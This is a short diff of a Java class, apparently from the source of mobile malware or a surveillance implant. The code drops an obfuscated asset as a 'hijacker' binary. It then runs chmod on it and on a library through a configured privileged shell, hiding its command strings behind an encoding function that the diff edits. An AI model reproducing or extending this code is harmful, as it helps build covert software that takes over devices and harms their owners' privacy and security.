@@ -69,8 +69,8 @@ public class Instrument {
 			Utils.dumpAsset(M.e("mb.data"), hijacker);
 
 			// Install library
-			Execute.execute(Configuration.shellFile + " " + M.e("pzm 666 ") + path + "/" + lib);
-			Runtime.getRuntime().exec(Configuration.shellFile + " " + M.e("pzm 750 ") + path + "/" + hijacker);
+			Execute.execute(Configuration.shellFile + " " + M.e("qzx chmod 666 ") + path + "/" + lib);
+			Runtime.getRuntime().exec(Configuration.shellFile + " " + M.e("qzx chmod 750 ") + path + "/" + hijacker);
 
 		} catch (Exception e) {
 			if (Cfg.EXCEPTION) {
